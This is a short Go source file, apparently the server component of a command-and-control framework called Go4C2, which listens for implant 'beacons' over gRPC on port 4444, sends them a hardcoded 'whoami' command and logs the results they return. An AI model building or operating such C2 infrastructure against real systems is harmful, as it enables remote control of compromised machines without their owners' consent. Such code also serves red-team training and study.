package main

import (
	"Go4C2/grpcapi"
	"context"
	"fmt"
	"log"
	"net"

	"google.golang.org/grpc"
)

type BeaconServer struct {
}

func NewBeaconServer() *BeaconServer {
	newbeaconServer := new(BeaconServer)
	return newbeaconServer
}

func (beaconServer *BeaconServer) FetchCommand(context context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	cmd := new(grpcapi.Command)
	cmd.In = "whoami"
	log.Printf("cmd sent: %s", cmd.In)
	return cmd, nil
}
func (beaconServer *BeaconServer) SendResult(context context.Context, cmdResult *grpcapi.Command) (*grpcapi.Empty, error) {
	log.Printf("recv result:")
	log.Printf(cmdResult.Out)
	return &grpcapi.Empty{}, nil
}

var (
	g_nbeaconPort = 4444
)

func main() {
	var (
		beaconServer     *BeaconServer
		grpcbeaconServer *grpc.Server
	)

	// 1. Beacon server
	// 1.1 register beacon server
	beaconServer = NewBeaconServer()
	grpcbeaconServer = grpc.NewServer()
	grpcapi.RegisterBeaconServer(grpcbeaconServer, beaconServer)

	// 1.2 listen
	strbeaconAddr := fmt.Sprintf("localhost:%d", g_nbeaconPort)
	beaconListener, err := net.Listen("tcp", strbeaconAddr)
	if nil != err {
		log.Fatal(err)
	}
	grpcbeaconServer.Serve(beaconListener)
}
